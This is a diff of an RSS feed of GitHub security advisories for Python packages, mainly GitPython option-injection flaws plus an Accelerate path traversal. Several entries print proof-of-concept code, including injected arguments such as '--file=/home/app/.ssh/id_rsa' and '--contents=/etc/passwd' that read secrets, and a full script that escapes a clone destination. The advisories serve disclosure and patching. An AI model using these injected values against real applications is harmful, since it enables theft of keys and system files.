@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-09-08T17:35:00.885Z</updated>
+    <updated>2026-09-08T20:12:50.407Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,936 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: TagReference.create positional reference bypasses kwargs-only --file guard, enabling arbitrary file read (incomplete fix of 3af0c251)]]></title>
+        <id>https://github.com/advisories/GHSA-3wxw-xv34-2frg</id>
+        <link href="https://github.com/advisories/GHSA-3wxw-xv34-2frg"/>
+        <updated>2026-09-08T19:42:24.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>TagReference.create()</code> forwards a caller-influenced positional <code>reference</code> value into <code>git tag</code> without it ever being inspected by the unsafe-option guard, allowing an arbitrary file read (the file's contents are returned in-band as the annotated tag message). This is an incomplete-fix bypass of commit <code>3af0c251</code> (the fix for GHSA-3f7w-8rr8-f37f's tag instance).</p>
+<h2 id="root-cause">Root Cause</h2>
+<p>The fix <code>3af0c251</code> added <code>unsafe_git_tag_options = ["--file","-F"]</code> and a guard call, but the guard is <code>Git.check_unsafe_options(options=Git._option_candidates([], kwargs), unsafe_options=...)</code> at <code>git/refs/tag.py:139</code> — it passes an EMPTY args list and inspects <strong>kwargs only</strong>. The dangerous values <code>path</code> and <code>reference</code> are POSITIONALS (<code>args = (path, reference)</code>, tag.py:156), placed before any <code>--</code>. A user-influenced <code>reference="--file=&lt;path&gt;"</code> therefore reaches <code>git tag</code> as the exact <code>--file</code> option the fix intended to block, creating an annotated tag whose message is the file's contents.</p>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary local file read at the privileges of the host process; contents returned in-band via <code>tagref.tag.message</code>. Requires the embedding application to forward a caller-influenced <code>reference</code> value into <code>TagReference.create()</code> (pure VALUE control — the CVE-2026-42215 threat model). Default <code>allow_unsafe_options=False</code>.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-python">from git import TagReference
+t = TagReference.create(repo, "vpwn", reference="--file=/home/app/.ssh/id_rsa")
+print(t.tag.message)   # contents of the file
+</code></pre>
+<h2 id="attack-chain">Attack Chain</h2>
+<ol>
+<li>Entry: app calls <code>TagReference.create(repo, name, reference=&lt;user&gt;)</code> with <code>reference="--file=/home/app/.ssh/id_rsa"</code>.</li>
+<li>Check: <code>Git.check_unsafe_options(_option_candidates([], kwargs), ["--file","-F"])</code> @ tag.py:137-141. Guard: denylist includes <code>--file</code>/<code>-F</code>. Bypass proof: <code>_option_candidates</code> receives <code>args=[]</code> → the positional <code>reference</code> is never a candidate (the kwarg spelling <code>file="…"</code> IS blocked; only the positional escapes).</li>
+<li>Sink: <code>repo.git.tag(*args, **kwargs)</code> @ tag.py:158 → no <code>--</code>. argv (observed): <code>['git','tag','-f','vpwn','--file=&lt;secret&gt;']</code>.</li>
+<li>Impact: annotated tag created; <code>tagref.tag.message</code> == file contents (arbitrary file read).</li>
+</ol>
+<h2 id="bypass-evidence">Bypass Evidence</h2>
+<p>Independently reproduced (independent test harness, git 2.43.0, default <code>allow_unsafe_options=False</code>): <code>TagReference.create(repo,'vp','--file=&lt;secret&gt;')</code> → PASSED; <code>tag.message == 'GATE_SECRET_LINE_A\nGATE_SECRET_LINE_B'</code>. Control: <code>TagReference.create(..., file='&lt;secret&gt;')</code> → <code>UnsafeOptionError: --file is not allowed</code>. Fix-commit read: <code>3af0c251</code> adds <code>_option_candidates([], kwargs)</code> (empty args → positional never a candidate).</p>
+<h2 id="affected-versions">Affected Versions</h2>
+<p><code>GitPython &lt;= 3.1.58</code> (sink present verbatim on the latest release tag; <code>git diff 3.1.57..HEAD</code> touches only test files).</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Include the positional <code>reference</code> (and <code>path</code>) in the option-candidate list passed to <code>check_unsafe_options</code>, or place a <code>--</code> separator before the positional arguments in <code>TagReference.create()</code>.</p>
+<hr>
+<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3wxw-xv34-2frg">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3wxw-xv34-2frg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78679">https://nvd.nist.gov/vuln/detail/CVE-2026-78679</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/pull/2208">https://github.com/gitpython-developers/GitPython/pull/2208</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/commit/1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6">https://github.com/gitpython-developers/GitPython/commit/1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.59">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.59</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-tagreference-create">https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-tagreference-create</a></li>
+<li><a href="https://github.com/advisories/GHSA-3wxw-xv34-2frg">https://github.com/advisories/GHSA-3wxw-xv34-2frg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3wxw-xv34-2frg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-08T19:42:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] Duplicate Advisory: GitPython: TagReference.create positional reference bypasses kwargs-only --file guard, enabling arbitrary file read (incomplete fix of 3af0c251)]]></title>
+        <id>https://github.com/advisories/GHSA-6rj2-96f5-chj9</id>
+        <link href="https://github.com/advisories/GHSA-6rj2-96f5-chj9"/>
+        <updated>2026-09-08T19:10:58.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-3wxw-xv34-2frg. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>GitPython before 3.1.59 contains an arbitrary file read vulnerability in TagReference.create() where a positional reference parameter bypasses the unsafe option guard. Attackers can supply a reference value like --file=</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3wxw-xv34-2frg">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3wxw-xv34-2frg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78679">https://nvd.nist.gov/vuln/detail/CVE-2026-78679</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-tagreference-create">https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-tagreference-create</a></li>
+<li><a href="https://github.com/advisories/GHSA-6rj2-96f5-chj9">https://github.com/advisories/GHSA-6rj2-96f5-chj9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6rj2-96f5-chj9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-25T03:32:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[accelerate] Accelerate path traversal and denial of service via sharded checkpoint weight_map entries]]></title>
+        <id>https://github.com/advisories/GHSA-4j2p-28q2-5m79</id>
+        <link href="https://github.com/advisories/GHSA-4j2p-28q2-5m79"/>
+        <updated>2026-09-08T18:46:24.000Z</updated>
+        <content type="html"><![CDATA[<p>Hugging Face Accelerate through 1.14.0 contains a path traversal vulnerability in load_checkpoint_in_model and load_checkpoint_and_dispatch functions that fail to sanitize weight_map entries from sharded checkpoint indexes. Attackers can supply relative paths with ../ sequences or absolute paths to read arbitrary files, or point shard entries at named pipes to cause indefinite blocking and denial of service.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-69112">https://nvd.nist.gov/vuln/detail/CVE-2026-69112</a></li>
+<li><a href="https://github.com/huggingface/accelerate/issues/4067">https://github.com/huggingface/accelerate/issues/4067</a></li>
+<li><a href="https://github.com/huggingface/accelerate/pull/4070">https://github.com/huggingface/accelerate/pull/4070</a></li>
+<li><a href="https://github.com/huggingface/accelerate/pull/4138">https://github.com/huggingface/accelerate/pull/4138</a></li>
+<li><a href="https://www.vulncheck.com/advisories/hugging-face-accelerate-path-traversal-and-dos-via-weight-map">https://www.vulncheck.com/advisories/hugging-face-accelerate-path-traversal-and-dos-via-weight-map</a></li>
+<li><a href="https://github.com/advisories/GHSA-4j2p-28q2-5m79">https://github.com/advisories/GHSA-4j2p-28q2-5m79</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4j2p-28q2-5m79</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-10T21:32:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: clone_from()/clone() omit --separate-git-dir from unsafe_git_clone_options, enabling arbitrary git-directory creation outside the destination]]></title>
+        <id>https://github.com/advisories/GHSA-8mcc-hrx5-hvxc</id>
+        <link href="https://github.com/advisories/GHSA-8mcc-hrx5-hvxc"/>
+        <updated>2026-09-08T18:41:55.000Z</updated>
+        <content type="html"><![CDATA[<ul>
+<li><strong>CWE:</strong> CWE-73 (External Control of File Name or Path) / CWE-22 (Path Traversal, in the "escapes intended base directory" sense)</li>
+<li><strong>Affected component:</strong> <code>git/repo/base.py</code>, <code>Repo.unsafe_git_clone_options</code> (class attribute, lines 153-165) and <code>Repo._clone()</code> (lines 1477-1520), reached via the public <code>Repo.clone_from()</code> (line 1626) and <code>Repo.clone()</code> (line 1567) APIs.</li>
+<li><strong>Affected version:</strong> GitPython at HEAD (<code>9729ed3b948f2bde09f1f188c5311e172212b67e</code>, 2026-08-05, VERSION <code>3.1.58</code>)</li>
+</ul>
+<h2 id="reachability">Reachability</h2>
+<p><code>Repo.clone_from(url, to_path, **kwargs)</code> (and <code>Repo.clone()</code>) forward arbitrary keyword arguments to the underlying <code>git clone</code> invocation. Before forwarding, GitPython builds a candidate option list from the kwargs (<code>Git._option_candidates</code>) and checks it against a denylist, <code>Repo.unsafe_git_clone_options</code>, via <code>Git.check_unsafe_options()</code> — <em>unless</em> the caller passes <code>allow_unsafe_options=True</code>. This denylist mechanism is exactly the guard that the last ~16 published GHSAs against this repo (2026-07-12 → 2026-08-05) have repeatedly found incomplete or bypassable for other options (<code>--template</code>, <code>--upload-pack</code>, <code>--config</code>, <code>--exec</code>, <code>--output</code>, <code>--index-output</code>, <code>--pathspec-from-file</code>, etc.).</p>
+<p><code>git clone</code> also accepts <code>--separate-git-dir=&lt;path&gt;</code>, which redirects the repository's entire <code>.git</code> metadata directory to an <strong>arbitrary, caller-controlled filesystem path</strong>, leaving only a gitlink text file (<code>gitdir: &lt;path&gt;</code>) at the intended destination. This is the exact same primitive already recognized as unsafe by GitPython's own code: <code>Repo.unsafe_git_init_options</code> (line 145-150) blocks <code>--separate-git-dir</code> for <code>Repo.init()</code>, with the comment <em>"Redirects the repository metadata to a caller-controlled path"</em>. The <code>Repo._clone()</code>/<code>clone()</code>/<code>clone_from()</code> docstring (line 1450-1452) is even more explicit:</p>
+<pre><code>:param allow_unsafe_options:
+    Allow unsafe options to be used, such as ``--template`` and
+    ``--separate-git-dir``.
+</code></pre>
+<p>i.e. the maintainers' own documentation states that <code>allow_unsafe_options=False</code> (the default) is supposed to block <code>--separate-git-dir</code> for clone. But <strong><code>Repo.unsafe_git_clone_options</code> does not contain it</strong>:</p>
+<pre><code class="language-python">unsafe_git_clone_options = [
+    "--upload-pack",
+    "-u",
+    "--config",
+    "-c",
+    "--template",
+    "--bundle-uri",
+]
+</code></pre>
+<p>So any application that forwards a <code>separate_git_dir</code> (or <code>separate-git-dir</code>) kwarg into <code>Repo.clone_from()</code> / <code>Repo.clone()</code> — e.g. a CI/build service, a Git-hosting proxy, or any tool that exposes a subset of clone options to a client, the exact threat model already accepted for the sibling <code>--template</code>/<code>--upload-pack</code>/<code>--config</code> entries in this same list — gets <strong>no protection at all</strong> for <code>--separate-git-dir</code>, even with the default <code>allow_unsafe_options=False</code>.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>Parity gap between two sibling denylists that guard the same underlying primitive (arbitrary redirection of git metadata storage): <code>unsafe_git_init_options</code> correctly lists <code>--separate-git-dir</code>; <code>unsafe_git_clone_options</code>, covering the same option on a different git subcommand that also accepts it, does not — despite the function's own docstring claiming otherwise. This is the same "denylist omits an equally-dangerous sibling option" pattern already responsible for <code>GHSA-539m-9xh6-q6rr</code> (<code>archive</code> denylist missing <code>--add-file</code>/<code>--add-virtual-file</code>) and <code>GHSA-6p8h-3wgx-97gf</code> (<code>clone</code> denylist missing <code>--template</code>, since fixed).</p>
+<h2 id="exploit-path">Exploit path</h2>
+<ol>
+<li>Attacker-controlled input reaches a <code>separate_git_dir=...</code> (or equivalently <code>"separate-git-dir"</code>) keyword argument passed into <code>Repo.clone_from()</code> / <code>Repo.clone()</code> by the host application, with <code>allow_unsafe_options</code> left at its default <code>False</code>.</li>
+<li><code>Git._option_candidates()</code> renders this as <code>--separate-git-dir</code> and <code>Git.check_unsafe_options()</code> checks it against <code>Repo.unsafe_git_clone_options</code> — no match, no <code>UnsafeOptionError</code> raised.</li>
+<li><code>Git.transform_kwargs()</code> renders the same kwarg into the real command line as <code>--separate-git-dir=&lt;attacker path&gt;</code> and GitPython executes <code>git clone -v --separate-git-dir=&lt;attacker path&gt; -- &lt;url&gt; &lt;dest&gt;</code> via <code>subprocess</code> (no shell).</li>
+<li><code>git</code> itself creates the full repository metadata tree (<code>config</code>, <code>description</code>, <code>HEAD</code>, <code>hooks/</code>, <code>index</code>, <code>objects/</code>, <code>refs/</code>, <code>packed-refs</code>, <code>logs/</code>) at the attacker-specified path — which can be <strong>any path outside the intended clone destination</strong> that the process has permission to create — and leaves a gitlink file at the intended destination pointing to it.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary directory/file creation at a path fully controlled by the attacker (bounded only by filesystem permissions of the process running GitPython), matching the impact class of the already-published, High-severity <code>GHSA-hmq2-w58f-27jc</code> ("Arbitrary Git Repository Creation Outside the Working Tree", CVSS 8.2). Concretely:</p>
+<ul>
+<li>Planting a git repository structure (including a <code>hooks/</code> directory) at an attacker-chosen location outside the sandboxed clone destination the calling application intended to confine the operation to.</li>
+<li>If the attacker-chosen path collides with an existing directory the process can write into (e.g. another repository's <code>.git</code>, a shared cache path, a predictable temp location), the clone silently populates/overwrites <code>config</code>, <code>HEAD</code>, <code>hooks/*</code>, <code>refs/*</code>, <code>packed-refs</code>, and <code>index</code> there — an integrity violation of a resource outside the intended destination.</li>
+<li>Combined with any later operation that runs <code>git</code> against that redirected/colliding directory (common in CI/build systems that reuse or predict working-directory layouts), this can escalate to hook execution, matching the RCE class already accepted for <code>--template</code> in <code>GHSA-9rj7-rf2p-w77r</code>.</li>
+</ul>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>The calling application forwards a caller-influenced value into a <code>separate_git_dir</code> kwarg of <code>Repo.clone_from()</code>/<code>Repo.clone()</code> (or into the <code>multi_options</code> list as a raw <code>--separate-git-dir=...</code> token) without itself validating/rejecting it, and does not pass <code>allow_unsafe_options=True</code> intentionally. This is the identical trust model GitPython's own denylist already defends for <code>--template</code>/<code>--upload-pack</code>/<code>--config</code>/<code>--bundle-uri</code> on the very same code path — i.e. this option was clearly meant to be covered by the same guard and was simply omitted.</li>
+<li>No authentication/role requirement inside GitPython itself; the vulnerable code runs the moment the host application calls the API with the option present.</li>
+</ul>
+<h2 id="evidence">Evidence</h2>
+<ul>
+<li><code>git/repo/base.py:145-151</code> — <code>unsafe_git_init_options</code> includes <code>"--separate-git-dir"</code> with the comment "Redirects the repository metadata to a caller-controlled path".</li>
+<li><code>git/repo/base.py:153-165</code> — <code>unsafe_git_clone_options</code> (the list actually enforced on <code>_clone</code>) does <strong>not</strong> include <code>"--separate-git-dir"</code>.</li>
+<li><code>git/repo/base.py:1450-1452</code> — docstring of <code>clone_from</code>/<code>clone</code> explicitly documents <code>--separate-git-dir</code> as one of the options <code>allow_unsafe_options</code> is supposed to gate.</li>
+<li><code>git/repo/base.py:1495-1518</code> — <code>_clone()</code> special-cases <code>separate_git_dir</code> only to <code>Git.polish_url()</code> it (path normalization for URL-like values), then runs it through <code>Git.check_unsafe_options(options=..., unsafe_options=cls.unsafe_git_clone_options)</code> — which, per the list above, does not flag it.</li>
+<li>PoC (<code>gitpython-001-poc.py</code>, embedded below) run against this exact checkout confirms the option reaches the real <code>git clone</code> subprocess unguarded and creates a full git directory outside the destination path, with <code>allow_unsafe_options</code> at its default <code>False</code>.</li>
+</ul>
+<h2 id="false-positive-check-adversarial-re-read">False-positive check (adversarial re-read)</h2>
+<ul>
+<li><strong>Is there a value-level check that would still stop this?</strong> No — <code>check_unsafe_options</code> only inspects option <em>names</em> (via <code>_canonicalize_option_name</code>) against the denylist; it performs no filesystem/path validation on <code>separate_git_dir</code>'s value, and no other guard in <code>_clone()</code> touches this kwarg besides the <code>Git.polish_url()</code> normalization (which does not reject arbitrary paths).</li>
+<li><strong>Is <code>--separate-git-dir</code> perhaps a no-op or safely sandboxed for <code>clone</code> specifically (unlike <code>init</code>)?</strong> No — confirmed empirically: the option reaches the real <code>git</code> binary unmodified and git honors it exactly as documented, writing the full metadata tree to the given path.</li>
+<li><strong>Could this be the exact bug already covered by one of the 26 published GHSAs?</strong> Checked all 26 entries in <code>_known-advisories.json</code> (Filter 0): <code>GHSA-9rj7-rf2p-w77r</code> covers <code>--template</code> in <code>Repo.init</code>; <code>GHSA-6p8h-3wgx-97gf</code> covers <code>--template</code> in clone (already fixed, present in <code>unsafe_git_clone_options</code>); <code>GHSA-hmq2-w58f-27jc</code> covers arbitrary repo creation via unvalidated <strong><code>.gitmodules</code> submodule names</strong> (a different code path — <code>Submodule</code>, not <code>Repo.clone_from()</code> kwargs). None reference <code>--separate-git-dir</code> on the clone path. This is a distinct, currently-unpatched gap.</li>
+<li><strong>Does this require an unrealistic precondition?</strong> The precondition (host app forwards a kwarg into <code>clone_from</code>/<code>clone</code>) is identical to the precondition already accepted by the maintainers for the sibling entries in the same list (<code>--template</code>, <code>--upload-pack</code>, <code>--config</code>, <code>--bundle-uri</code>) — i.e. it is the same threat model the guard exists to cover, just missing one entry.</li>
+<li>Verdict: no concrete blocker found. <strong>CONFIRMED.</strong></li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Add <code>"--separate-git-dir"</code> (and its <code>-</code> alias if git ever adds one — currently there is none) to <code>Repo.unsafe_git_clone_options</code> in <code>git/repo/base.py</code>, matching <code>unsafe_git_init_options</code>. Since <code>Repo._clone()</code> already special-cases <code>separate_git_dir</code> for <code>Git.polish_url()</code> normalization, the fix is a one-line addition to the existing list, consistent with how <code>GHSA-6p8h-3wgx-97gf</code> added <code>--template</code> to the same list.</p>
+<h2 id="confidence">Confidence</h2>
+<p>High. Root cause is a one-line, unambiguous omission the maintainers' own docstring contradicts; PoC reproduces cleanly and deterministically against the current HEAD; no plausible false-positive path found.</p>
+<h2 id="proof-of-concept-source-gitpython-001-pocpy">Proof-of-Concept source (<code>gitpython-001-poc.py</code>)</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+GITPYTHON-001 PoC: Repo.clone_from(separate_git_dir=...) is not in
+unsafe_git_clone_options, so it reaches `git clone` unguarded and writes a
+full git directory (config, hooks/, objects/, refs/, ...) to an
+attacker-controlled path OUTSIDE the intended destination directory, with
+allow_unsafe_options left at its default of False.
+
+Run against the GitPython source tree under test, e.g.:
+  PYTHONPATH="&lt;repo&gt;:&lt;repo&gt;/gitdb:&lt;repo&gt;/smmap" python3 gitpython-001-poc.py &lt;workdir&gt;
+
+Benign: only writes/reads inside the given workdir. No destructive/exfiltrating
+payload. Exits non-zero and prints "NOT VULNERABLE" if the guard blocks the option
+or the write does not escape the destination directory.
+"""
+import os
+import sys
+import subprocess
+
+
+def main():
+    workdir = sys.argv[1] if len(sys.argv) &gt; 1 else "/tmp/gitpython-001-poc"
+    src = os.path.join(workdir, "src")
+    dest = os.path.join(workdir, "dest")
+    sentinel_dir = os.path.join(workdir, "OUTSIDE_SENTINEL")
+    target_gitdir = os.path.join(sentinel_dir, "redirected.git")
+
+    for p in (src, dest, sentinel_dir):
+        os.makedirs(p, exist_ok=True)
+
+    # Minimal benign source repo to clone from.
+    subprocess.run(["git", "init", "-q", "-b", "main", src], check=True)
+    subprocess.run(["git", "-C", src, "config", "user.email", "test@example.com"], check=True)
+    subprocess.run(["git", "-C", src, "config", "user.name", "Test"], check=True)
+    with open(os.path.join(src, "file.txt"), "w") as f:
+        f.write("hello\n")
+    subprocess.run(["git", "-C", src, "add", "file.txt"], check=True)
+    subprocess.run(["git", "-C", src, "commit", "-q", "-m", "init"], check=True)
+
+    import git  # gitpython under test
+
+    print("unsafe_git_clone_options =", git.Repo.unsafe_git_clone_options)
+    assert "--separate-git-dir" not in git.Repo.unsafe_git_clone_options, (
+        "guard now includes --separate-git-dir; PoC no longer applicable, target patched"
+    )
+
+    try:
+        repo = git.Repo.clone_from(src, dest, separate_git_dir=target_gitdir)
+    except git.exc.UnsafeOptionError as e:
+        print("NOT VULNERABLE: blocked by UnsafeOptionError:", e)
+        sys.exit(1)
+
+    wrote_outside = os.path.isdir(os.path.join(target_gitdir, "hooks")) and os.path.isfile(
+        os.path.join(target_gitdir, "config")
+    )
+    gitlink_points_outside = False
+    with open(os.path.join(dest, ".git")) as f:
+        gitlink = f.read().strip()
+        gitlink_points_outside = target_gitdir in gitlink
+
+    print("repo.git_dir =", repo.git_dir)
+    print("wrote git directory outside dest (sentinel) =", wrote_outside)
+    print("dest/.git gitlink points outside dest =", gitlink_points_outside)
+
+    if wrote_outside and gitlink_points_outside:
+        print("VULNERABLE: git directory created at attacker-controlled path "
+              f"outside the clone destination: {target_gitdir}")
+        sys.exit(0)
+    else:
+        print("NOT VULNERABLE: sentinel not observed")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-8mcc-hrx5-hvxc">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-8mcc-hrx5-hvxc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78677">https://nvd.nist.gov/vuln/detail/CVE-2026-78677</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/pull/2210">https://github.com/gitpython-developers/GitPython/pull/2210</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/commit/b68afff45af0f49e79a3e2d2162018986b37ad5d">https://github.com/gitpython-developers/GitPython/commit/b68afff45af0f49e79a3e2d2162018986b37ad5d</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.59">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.59</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3787.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3787.yaml</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-path-traversal-via-separate-git-dir">https://www.vulncheck.com/advisories/gitpython-before-path-traversal-via-separate-git-dir</a></li>
+<li><a href="https://github.com/advisories/GHSA-8mcc-hrx5-hvxc">https://github.com/advisories/GHSA-8mcc-hrx5-hvxc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8mcc-hrx5-hvxc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-08T18:41:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[gitpython] Duplicate Advisory: clone_from()/clone() omit --separate-git-dir from unsafe_git_clone_options, enabling arbitrary git-directory creation outside the destination]]></title>
+        <id>https://github.com/advisories/GHSA-7r39-6q8m-qw68</id>
+        <link href="https://github.com/advisories/GHSA-7r39-6q8m-qw68"/>
+        <updated>2026-09-08T18:41:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-8mcc-hrx5-hvxc. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>GitPython before 3.1.59 omits --separate-git-dir from unsafe_git_clone_options, allowing attackers to create arbitrary git directories outside the intended clone destination. Attackers can pass a separate_git_dir parameter to Repo.clone_from() or Repo.clone() to redirect repository metadata to an attacker-controlled filesystem path, enabling arbitrary directory creation and potential hook execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-8mcc-hrx5-hvxc">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-8mcc-hrx5-hvxc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78677">https://nvd.nist.gov/vuln/detail/CVE-2026-78677</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-path-traversal-via-separate-git-dir">https://www.vulncheck.com/advisories/gitpython-before-path-traversal-via-separate-git-dir</a></li>
+<li><a href="https://github.com/advisories/GHSA-7r39-6q8m-qw68">https://github.com/advisories/GHSA-7r39-6q8m-qw68</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7r39-6q8m-qw68</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-25T03:32:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: Incomplete unsafe_git_revision_options denylist omits --contents/-S, enabling arbitrary file read via Repo.blame()]]></title>
+        <id>https://github.com/advisories/GHSA-5xxx-qhh7-9287</id>
+        <link href="https://github.com/advisories/GHSA-5xxx-qhh7-9287"/>
+        <updated>2026-09-08T18:41:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>Repo.blame()</code> / <code>Repo.blame_incremental()</code> guard forwarded revision options against <code>unsafe_git_revision_options</code>, but that denylist only contains the file-WRITE options <code>--output</code>/<code>-o</code>. <code>git blame</code> also honors <code>--contents &lt;file&gt;</code> and <code>-S &lt;file&gt;</code>, which cause the file's lines to be echoed into the blame result — an arbitrary file READ. Neither option is in the denylist, so a caller-influenced revision value of <code>--contents=&lt;path&gt;</code> passes the guard and leaks file contents. This is a distinct sink-option and impact class (READ) from GHSA-956x-8gvw-wg5v (which addressed the blame <code>--output</code> WRITE), directly analogous to GHSA-539m-9xh6-q6rr (archive READ gap accepted separately from the archive write/exec advisory).</p>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>unsafe_git_revision_options = ["--output","-o"]</code> (<code>git/repo/base.py:188</code>). The <code>rev</code> string is passed to <code>_option_candidates([rev], kwargs)</code> and placed BEFORE the <code>--</code> separator (base.py:841). The canonical name of <code>--contents=...</code> is <code>contents</code>, which is not on the denylist, so no <code>UnsafeOptionError</code> is raised. The trailing <code>--</code> protects only the pathspec, not the option before the revision.</p>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary local file read at the privileges of the host process; the file's line contents appear in the blame result returned to the caller. Pure VALUE control (the caller forwards a user-influenced revision string). Default <code>allow_unsafe_options=False</code>.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-python">result = repo.blame("--contents=/etc/passwd", "a.txt")
+# result rows carry the victim file's line text
+</code></pre>
+<h2 id="attack-chain">Attack Chain</h2>
+<ol>
+<li>Entry: app calls <code>repo.blame(rev, file)</code> with attacker <code>rev="--contents=/etc/passwd"</code> (or kwarg <code>contents="/etc/passwd"</code>, or <code>-S</code>).</li>
+<li>Check: <code>Git.check_unsafe_options(_option_candidates([rev,...], kwargs), unsafe_git_revision_options)</code> @ base.py:841. Guard: denylist = <code>["--output","-o"]</code> only. Bypass proof: canonical name <code>contents</code> ∉ denylist → no error.</li>
+<li>Sink: <code>self.git.blame(rev, "--", file, p=True, ...)</code>. argv (observed): <code>['git','blame','-p','--contents=&lt;secret&gt;','HEAD','--','a.txt']</code>.</li>
+<li>Impact: blame result rows carry the victim file's line text.</li>
+</ol>
+<h2 id="bypass-evidence">Bypass Evidence</h2>
+<p>Independently reproduced (independent test harness, default <code>allow_unsafe_options=False</code>): <code>blame('--contents=&lt;secret&gt;','a.txt')</code> → guard PASSED; result rows = <code>['GATE_SECRET_LINE_A','GATE_SECRET_LINE_B']</code>. Control: <code>blame('--output=…')</code> still BLOCKED (guard active on this path). <code>-S</code> kwarg argv also reaches git unguarded.</p>
+<h2 id="affected-versions">Affected Versions</h2>
+<p><code>GitPython &lt;= 3.1.58</code> (denylist present verbatim on the latest release tag).</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
